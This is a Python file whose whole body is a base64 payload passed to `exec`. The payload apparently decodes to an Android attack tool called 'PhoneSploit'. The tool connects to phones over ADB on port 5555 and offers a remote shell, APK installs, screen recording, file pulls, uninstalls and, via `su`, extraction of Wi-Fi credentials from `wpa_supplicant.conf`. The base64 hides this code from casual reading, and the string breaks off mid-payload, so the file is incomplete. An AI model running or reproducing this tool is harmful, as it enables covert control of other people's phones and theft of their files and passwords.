import marshal, base64
exec(base64.b64decode("Iy0qLSBjb2Rpbmc6IHV0Zi04IC0qLQoKI0NvZGVkIEJ5IFp1Y2NjcwojIEVuam95CgoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiNJbXBvcnRzCmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCByYW5kb20KaW1wb3J0IHRpbWUgYXMgIHQKZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSwgaW5pdAoKcmVsb2FkKHN5cykKc3lzLnNldGRlZmF1bHRlbmNvZGluZygidXRmLTgiKQoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgVmFyaWFibGVzCkN1cnJlbnREaXIgPSBvcy5wYXRoLmRpcm5hbWUob3MucGF0aC5hYnNwYXRoKF9fZmlsZV9fKSkKbG9hZF9jb3VudCA9IDAKcGFnZTIgPSBGYWxzZQoKIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiNJbnN0YWxsIEZ1bmN0aW9ucwojIGRlZiBDb2xvcmluZ01vZGVTdGFydHVwKCk6CiMgICAgIGNvbG9yaW5nX2ZpbGUgPSBvcGVuKEN1cnJlbnREaXIrIlxcaW5zdGFsbFxcY29sb3JpbmcudHh0IiwgImErIikKIyAgICAgbGluZSA9IG9wZW4oQ3VycmVudERpcisiXFxpbnN0YWxsXFxjb2xvcmluZy50eHQiLCAiYSsiKS5yZWFkbGluZSgpCiMgICAgIGlmICdpbml0JyBpbiBsaW5lOgojICAgICAgICAgaW5pdChjb252ZXJ0PVRydWUpCiMgICAgICAgICBtYWluKCkKIyAgICAgaWYgJ2ZhbHNlJyBpbiBsaW5lOgojICAgICAgICAgbWFpbigpCiMgICAgIGlmICJOT1RfTE9BREVEIiBpbiBsaW5lOgojICAgICAgICAgcGxhdGZvcm1fY2hvaWNlID0gcmF3X2lucHV0KCJBcmUgeW91IGxvYWRpbmcgdGhpcyBzY3JpcHQgaW4gKFcpaW5kb3dzIG9yIChMKWludXg6ICIpCiMgICAgICAgICBvcGVuKEN1cnJlbnREaXIrIlxcaW5zdGFsbFxcY29sb3JpbmcudHh0IiwgInciKS5jbG9zZSgpCiMgICAgICAgICBpZiBwbGF0Zm9ybV9jaG9pY2UubG93ZXIoKSA9PSAndyc6CiMgICAgICAgICAgICAgY29sb3JpbmdfZmlsZS53cml0ZSgiaW5pdCIpCiMgICAgICAgICBlbHNlOgojICAgICAgICAgICAgIGNvbG9yaW5nX2ZpbGUud3JpdGUoImZhbHNlIikKIyAgICAgICAgICAgICB5biA9IHJhd19pbnB1dChGb3JlLldISVRFICsgIkhhdmUgeW91IGFscmVhZHkgaW5zdGFsbGVkIGFkYiB2aWEgY29tbWFuZCBsaW5lICIrRm9yZS5HUkVFTiArICJZIitGb3JlLldISVRFKyIvIitGb3JlLlJFRCsiTiAiK0ZvcmUuV0hJVEUpCiMgICAgICAgICAgICAgaWYgeW4gPT0gIm4iOgojICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInN1ZG8gYXB0IGluc3RhbGwgYWRiIikKIyAgICAgICAgICAgICBlbHNlOgojICAgICAgICAgICAgICAgICBtYWluKCkKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojIEdyYXBoaWNzICMgaHR0cDovL3BhdG9yamsuY29tL3NvZnR3YXJlL3RhYWcvI3A9ZGlzcGxheSZmPUdyYWZmaXRpJnQ9VHlwZSUyMFNvbWV0aGluZyUyMAoKYXJyb3cgPSBGb3JlLlJFRCArICIgIOKUlOKUgOKUgD4iLmRlY29kZSgidXRmLTgiKS5zdHJpcCgpICsgRm9yZS5XSElURQphcnJvdyA9IHN0cihhcnJvdykKY29ubmVjdCA9IEZvcmUuUkVEICsgIuKUgiIuZGVjb2RlKCJ1dGYtOCIpLnN0cmlwKCkgKyBGb3JlLldISVRFCgpsb2dvX2Rlc2lnbl8xID0gKCcnJwogIHswfSAgX19fXyAgX18gICAgICAgICAgICAgICAgICAgIF9fX19fICAgICAgIF9fICAgICAgXyBfXyAKICAgLyBfXyBcLyAvXyAgX19fXyAgX19fXyAgX19fIC8gX19fL19fX18gIC8gL19fXyAgKF8pIC9fCiAgLyAvXy8gLyBfXyBcLyBfXyBcLyBfXyBcLyBfIFxcX18gXC8gX18gXC8gLyBfXyBcLyAvIF9fLwp7MX0gLyBfX19fLyAvIC8gLyAvXy8gLyAvIC8gLyAgX18vX18vIC8gL18vIC8gLyAvXy8gLyAvIC9fICAKL18vICAgL18vIC9fL1xfX19fL18vIC9fL1xfX18vX19fXy8gLl9fXy9fL1xfX19fL18vXF9fLyAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLycnJykuZm9ybWF0KEZvcmUuR1JFRU4sIEZvcmUuV0hJVEUsIEZvcmUuUkVEKQoKbG9nb19kZXNpZ25fMiA9IEZvcmUuR1JFRU4gKyAnJycgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAuOycgICAgICAgICAgICAgICAgICAgICBgOywKIC47JyAgLDsnICAgICAgICAgICAgIGA7LCAgYDssICAgezB9UGhvbmVTcGxvaXQKLjsnICAsOycgICw7JyAgICAgYDssICBgOywgIGA7LAo6OiAgIDo6ICAgOiAgIHsxfSggKXswfSAgIDogICA6OiAgIDo6ICB7MX1Db2RlZCBieSBadWNjY3MgLyBNZXRhY2hhcnswfQonOi4gICc6LiAgJzouIHsxfS9fXHswfSAsOicgICw6JyAgLDonCiAnOi4gICc6LiAgICB7MX0vX19fXHswfSAgICAsOicgICw6JyAgIAogICc6LiAgICAgICB7MX0vX19fX19cezB9ICAgICAgLDonCiAgICAgICAgICAgezF9LyAgICAgICBcXHswfQonJycuZm9ybWF0KEZvcmUuR1JFRU4sIEZvcmUuV0hJVEUsIEZvcmUuUkVEKQoKbG9nb19kZXNpZ25fcHJlID0gJycnCnswfeKVlOKVkOKVl3sxfeKUrCDilKzilIzilIDilJDilIzilJDilIzilIzilIDilJB7MH3ilZTilZDilZd7MX3ilIzilIDilJDilKwgIOKUjOKUgOKUkOKUrOKUjOKUrOKUkAp7MH3ilaDilZDilZ17MX3ilJzilIDilKTilIIg4pSC4pSC4pSC4pSC4pSc4pSkIHswfeKVmuKVkOKVl3sxfeKUnOKUgOKUmOKUgiAg4pSCIOKUguKUgiDilIIgCnswfeKVqSAgezF94pS0IOKUtOKUlOKUgOKUmOKUmOKUlOKUmOKUlOKUgOKUmHswfeKVmuKVkOKVnXsxfeKUtCAg4pS04pSA4pSY4pSU4pSA4pSY4pS0IOKUtCAnJycuZm9ybWF0KEZvcmUuR1JFRU4sIEZvcmUuV0hJVEUsIEZvcmUuUkVEKQpsb2dvX2Rlc2lnbl8zID0gbG9nb19kZXNpZ25fcHJlLmRlY29kZSgidXRmLTgiKQoKbG9nb19kZXNpZ25fNCA9ICcnJwpcMDMzWzkybQogICAgICAgICAgK2h5ZE5OTk5keWgrCiAgICAgICAgK21NTU1NTU1NTU1NTU1tKwogICAgICBgZE1NbVwwMzNbMG06XDAzM1s5Mm1OTU1NTU1NTlwwMzNbMG06XDAzM1s5Mm1tTU1kYAogICAgICBoTU1NTU1NTU1NTU1NTU1NTU1NaAogIFwwMzNbOTJtLi4gIHl5eXl5eXl5eXl5eXl5eXl5eXl5ICAuLiAgICAgICAgICAgICAgXDAzM1swbSBFeHBsb2l0IHRpbWUgOikgXDAzM1s5Mm0KXDAzM1s5Mm0ubU1NbWBNTU1NTU1NTU1NTU1NTU1NTU1NTWBtTU1tLiAgICAgICAgICAgIFwwMzNbMG0gVGhhbmtzIGZvciBkb3dubG9hZGluZyFcMDMzWzkybQpcMDMzWzkybTpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06CjpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06CjpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06CjpNTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU06Ci1NTU1NLU1NTU1NTU1NTU1NTU1NTU1NTU1NLU1NTU0tCiAreXkrIE1NTU1NTU1NTU1NTU1NTU1NTU1NICt5eSsKICAgICAgbU1NTU1NTU1NTU1NTU1NTU1NTW0KICAgICAgYC8rK01NTU1oKytoTU1NTSsrL2AKICAgICAgICAgIE1NTU1vICBvTU1NTQogICAgICAgICAgTU1NTW8gIG9NTU1NCiAgICAgICAgICBvTk1tLSAgLW1NTnMnJycKCnBhZ2VfMSA9ICcnJ1xuCnswfVt7MX0xezB9XSB7Mn1TaG93IENvbm5lY3RlZCBEZXZpY2VzICAgICAgezB9W3sxfTZ7MH1dIHsyfVNjcmVlbiByZWNvcmQgYSBwaG9uZSAgICAgICAgICAgICAgIHswfVt7MX0xMXswfV0gezJ9VW5pbnN0YWxsIGFuIGFwcCAgICAgICAgICAgICAgICAgICAKezB9W3sxfTJ7MH1dIHsyfURpc2NvbmVjdCBhbGwgZGV2aWNlcyAgICAgICB7MH1bezF9N3swfV0gezJ9U2NyZWVuIFNob3QgYSBwaWN0dXJlIG9uIGEgcGhvbmUgICAgezB9W3sxfTEyezB9XSB7Mn1TaG93IHJlYWwgdGltZSBsb2cgb2YgZGV2aWNlICAgICAgIAp7MH1bezF9M3swfV0gezJ9Q29ubmVjdCBhIG5ldyBwaG9uZSAgICAgICAgIHswfVt7MX04ezB9XSB7Mn1SZXN0YXJ0IFNlcnZlciAgICAgICAgICAgICAgICAgICAgICB7MH1bezF9MTN7MH1dIHsyfUR1bXAgU3lzdGVtIEluZm8gICAgICAgICAgICAgICAgICAgCnswfVt7MX00ezB9XSB7Mn1BY2Nlc3MgU2hlbGwgb24gYSBwaG9uZSAgICAgezB9W3sxfTl7MH1dIHsyfVB1bGwgZm9sZGVycyBmcm9tIHBob25lIHRvIHBjICAgICAgIHswfVt7MX0xNHswfV0gezJ9TGlzdCBhbGwgYXBwcyBvbiBhIHBob25lICAgICAgICAgICAKezB9W3sxfTV7MH1dIHsyfUluc3RhbGwgYW4gYXBrIG9uIGEgcGhvbmUgICB7MH1bezF9MTB7MH1dIHsyfVR1cm4gVGhlIERldmljZSBvZmYgICAgICAgICAgICAgICAgezB9W3sxfTE1ezB9XSB7Mn1SdW4gYW4gYXBwICAgICAgICAgICAgICAgICAgICAgICAgIAoKCnswfVt7MX05OXswfV0gezJ9RXhpdCAgIHswfVt7MX0wezB9XSB7Mn1DbGVhciAgIHswfVt7MX1wezB9XSBOZXh0IFBhZ2UgICAgICAgICAgICAgICAgICAgICAgICAgICB2MS4yCicnJy5mb3JtYXQoRm9yZS5DWUFOLCBGb3JlLlJFRCwgRm9yZS5HUkVFTikKCnBhZ2VfMiA9ICcnJ1xuCnswfVt7MX0xNnswfV17Mn0gUG9ydCBGb3J3YXJkaW5nICAgICAgICAgICAgICAgIHswfVt7MX0yMXswfV17Mn0gTmV0U3RhdCAKezB9W3sxfTE3ezB9XXsyfSBHcmFiIHdwYV9zdXBwbGljYW50ICAgICAgICAgICAgezB9W3sxfTIyezB9XXsyfSBUdXJuIFdpRmkgT24vT2ZmICAgICAgICAgICAgICAgICAKezB9W3sxfTE4ezB9XXsyfSBTaG93IE1hYy9JbmV0ICAgICAgICAgICAgICAgICAgezB9W3sxfTIzezB9XXsyfSBSZW1vdmUgUGFzc3dvcmQKezB9W3sxfTE5ezB9XXsyfSBFeHRyYWN0IGFwayBmcm9tIGFwcCAgICAgICAgICAgezB9W3sxfTI0ezB9XXsyfSBVc2UgS2V5Y29kZSAgICAgICAgICAgIAp7MH1bezF9MjB7MH1dezJ9IEdldCBCYXR0ZXJ5IFN0YXR1cyAgICAgICAgICAgICB7MH1bezF9MjV7MH1dezJ9IEdldCBDdXJyZW50IEFjdGl2aXR5ICAgICAgICAgICAgICAgICAgCgoKezB9W3sxfTk5ezB9XSB7Mn1FeGl0ICAgezB9W3sxfTB7MH1dIHsyfUNsZWFyICAgezB9W3sxfWJ7MH1dIEJhY2sgdG8gcGFnZSBvbmUKJycnLmZvcm1hdChGb3JlLkNZQU4sIEZvcmUuUkVELCBGb3JlLkdSRUVOKQoKCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQojTWFpbgpkZWYgbWFpbigpOgogICAgcGFnZV9udW0gPSAxCiAgICBvcy5zeXN0ZW0oImFkYiB0Y3BpcCA1NTU1IikKICAgIG9zLnN5c3RlbSgiYWRiIGRldmljZXMgLWwiKQogICAgcHJpbnQgKCgiXG5bezB9K3sxfV0gRW50ZXIgYSBwaG9uZXMgaXAgYWRkcmVzcy4oVHlwZSA5OSB0byBleGl0KSIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICB0cnk6CiAgICAgICAgZGV2aWNlX25hbWUgPSByYXdfaW5wdXQgKGFycm93KyIgcGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihjb25uZWN0X3Bob25lKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgIG1haW4oKQogICAgaWYgZGV2aWNlX25hbWUgPT0gJyc6CiAgICAgICAgbWFpbigpCiAgICBpZiBkZXZpY2VfbmFtZSA9PSAnOTknOgogICAgICAgIGV4aXQoKQogICAgb3Muc3lzdGVtKCJhZGIgY29ubmVjdCAiK2RldmljZV9uYW1lKyI6NTU1NSIpCiAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICB3aGlsZSgxKToKICAgICAgICBpZiBvcHRpb24gPT0gJzEnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiBkZXZpY2VzIC1sIikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uICA9PSAgJzInOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiBkaXNjb25uZWN0IikKICAgICAgICAgICAgbWFpbigpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICczJzoKICAgICAgICAgICAgbWFpbigpCgogICAgICAgIGVsaWYgb3B0aW9uICA9PSAnNCc6CiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnNSc6CiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIHRoZSBhcGsgbG9jYXRpb24uIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgYXBrX2xvY2F0aW9uID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKGFwa19pbnN0YWxsKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAgIitkZXZpY2VfbmFtZSsiIGluc3RhbGwgIithcGtfbG9jYXRpb24pCiAgICAgICAgICAgIHByaW50IChGb3JlLkdSRUVOICArICAiQXBrIGhhcyBiZWVuIGluc3RhbGxlZC4iKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gICc2JzoKICAgICAgICAgICAgcHJpbnQgKCgiICAgICAiK2Nvbm5lY3QpKQogICAgICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dIFBsZWFzZSB3YWl0IDNtIGl0cyByZWNvcmRpbmciKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBzaGVsbCBzY3JlZW5yZWNvcmQgL3NkY2FyZC9kZW1vLm1wNCIpCiAgICAgICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciB3aGVyZSB5b3Ugd291bGQgbGlrZSB0aGUgdmlkZW8gdG8gYmUgc2F2ZWQuW0RlZmF1bHQ6IHByZXNlbnQgd29ya2luZyBkaXJlY3RvcnldIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgcGxhY2VfbG9jYXRpb24gPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoc2NyZWVuX3JlY29yZCkgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHB1bGwgL3NkY2FyZC9kZW1vLm1wNCAiK3BsYWNlX2xvY2F0aW9uKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gID09ICc3JzoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIHNjcmVlbmNhcCAvc2RjYXJkL3NjcmVlbi5wbmciKQogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciB3aGVyZSB5b3Ugd291bGQgbGlrZSB0aGUgc2NyZWVuc2hvdCB0byBiZSBzYXZlZC5bRGVmYXVsdDogcHJlc2VudCB3b3JraW5nIGRpcmVjdG9yeV0iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwbGFjZV9sb2NhdGlvbiA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihzY3JlZW5zaG90KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgcHVsbCAvc2RjYXJkL3NjcmVlbi5wbmcgIitwbGFjZV9sb2NhdGlvbikKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICc4JzoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIga2lsbC1zZXJ2ZXIgJiYgYWRiIHN0YXJ0LXNlcnZlciIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnOSc6CiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIGEgZmlsZSBsb2NhdGlvbiBvbiBhIGRldmljZSIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIGZpbGVfbG9jYXRpb24gPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoZmlsZV9wdWxsKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBwcmludCAoKCIgICAgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICAgICBbezB9K3sxfV1FbnRlciB3aGVyZSB5b3Ugd291bGQgbGlrZSB0aGUgZmlsZSB0byBiZSBzYXZlZC5bRGVmYXVsdDogcHJlc2VudCB3b3JraW5nIGRpcmVjdG9yeV0iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwbGFjZV9sb2NhdGlvbiA9IHJhd19pbnB1dCgiICAgICAgICIrYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihmaWxlX3B1bGwpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgICAgIG9zLnN5c3RlbSgiYWRiIC1zICIrZGV2aWNlX25hbWUrIiBwdWxsICIrZmlsZV9sb2NhdGlvbisiICIrcGxhY2VfbG9jYXRpb24pCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMTAnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyAiIHJlYm9vdCAiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gICcxMSc6CiAgICAgICAgICAgIHByaW50ICgoIiAgICAgIitjb25uZWN0KSkKICAgICAgICAgICAgcHJpbnQgKCgiICAgIFt7MH0rezF9XUVudGVyIGEgcGFja2FnZSBuYW1lLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIHBhY2thZ2VfbmFtZSA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihhcHBfZGVsZXRlKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgdW5pc3RhbGwgIitwYWNrYWdlX25hbWUpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMTInOgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2FkYiAtcyAnK2RldmljZV9uYW1lKyIgbG9nY2F0ICIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMTMnOgogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAgLXMgIitkZXZpY2VfbmFtZSsiIGR1bXBzeXMiKQogICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgZWxpZiBvcHRpb24gPT0gJzE0JzoKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIiArZGV2aWNlX25hbWUrICIgc2hlbGwgcG0gbGlzdCBwYWNrYWdlcyAtZiIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMTUnOgogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciBhIHBhY2thZ2UgbmFtZS4gVGhleSBsb29rIGxpa2UgdGhpcyAtLT4gY29tLnNuYXBjaGF0LmFuZHJvaWQiKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwYWNrYWdlX25hbWUgPSByYXdfaW5wdXQoIiAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIoYXBwX3J1bikgIitGb3JlLldISVRFICsgIj4gIikKICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsIG1vbmtleSAtcCAiK3BhY2thZ2VfbmFtZSsiIC12IDUwMCIpCiAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAgICBlbGlmIG9wdGlvbiA9PSAnMTYnOgogICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICBbezB9K3sxfV1FbnRlciBhIHBvcnQgb24gdGhlIGRldmljZS4iKS5mb3JtYXQoRm9yZS5SRUQsIEZvcmUuV0hJVEUpKQogICAgICAgICAgICBwb3J0X2RldmljZSA9IHJhd19pbnB1dCgiICAgICIrYXJyb3cgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihwb3J0X2ZvcndhcmQpICIrRm9yZS5XSElURSArICI+ICIpCiAgICAgICAgICAgIHByaW50ICgoIiAgICAgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgIHByaW50ICgoIiAgICAgICAgW3swfSt7MX1dRW50ZXIgYSBwb3J0IHRvIGZvcndhcmQgaXQgdG9vLiIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgIGZvcndhcmRfcG9ydCA9IHJhd19pbnB1dCgiICAgICAgICAiK2Fycm93ICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIocG9ydF9mb3J3YXJkKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImFkYiAtcyAiK2RldmljZV9uYW1lKyIgZm9yd2FyZCB0Y3A6Iitwb3J0X2RldmljZSsiIHRjcDoiK2ZvcndhcmRfcG9ydCkKICAgICAgICAgICAgb3B0aW9uID0gcmF3X2lucHV0KEZvcmUuV0hJVEUgKyAicGhvbmVzcGxvaXQiK0ZvcmUuUkVEICsgIihtYWluX21lbnUpICIrRm9yZS5XSElURSArICI+ICIpCgogICAgICAgIGVsaWYgb3B0aW9uID09ICcxNyc6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHByaW50ICgoRm9yZS5XSElURSArICIgICAgW3swfSt7MX1dezF9VEhFIERFVklDRSBORUVEUyBUTyBCRSBST09URUQgVE8gQ09OVElOVUUgVE8gRVhJVCBVU0UgQ1RSTCArQyIpLmZvcm1hdChGb3JlLlJFRCwgRm9yZS5XSElURSkpCiAgICAgICAgICAgICAgICBwcmludCAoKCIgICAgICIrY29ubmVjdCkpCiAgICAgICAgICAgICAgICBwcmludCAoKCIgICAgW3swfSt7MX1dRW50ZXIgd2hlcmUgeW91IHdhbnQgdGhlIGZpbGUgdG8gYmUgc2F2ZWQuW0RlZmF1bHQ6IHByZXNlbnQgd29ya2luZyBkaXJlY3RvcnldIikuZm9ybWF0KEZvcmUuUkVELCBGb3JlLldISVRFKSkKICAgICAgICAgICAgICAgIGxvY2F0aW9uID0gcmF3X2lucHV0KCIgICAgIithcnJvdyArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKHdwYV9ncmFiKSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHNoZWxsICIrInN1IC1jICdjcCAvZGF0YS9taXNjL3dpZmkvd3BhX3N1cHBsaWNhbnQuY29uZiAvc2RjYXJkLyciKQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJhZGIgLXMgIitkZXZpY2VfbmFtZSsiIHB1bGwgL3NkY2FyZC93cGFfc3VwcGxpY2FudC5jb25mICIrbG9jYXRpb24pCiAgICAgICAgICAgICAgICBvcHRpb24gPSByYXdfaW5wdXQoRm9yZS5XSElURSArICJwaG9uZXNwbG9pdCIrRm9yZS5SRUQgKyAiKG1haW5fbWVudSkgIitGb3JlLldISVRFICsgIj4gIikKCiAgICAgICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoKICAgICAgICAgICAgICAgIG9wdGlvbiA9IHJhd19pbnB1dChGb3JlLldISVRFICsgInBob25lc3Bsb2l0IitGb3JlLlJFRCArICIobWFpbl9tZW51KSAiK0ZvcmUuV0hJVEUgKyAiPiAiKQoKICAgICAg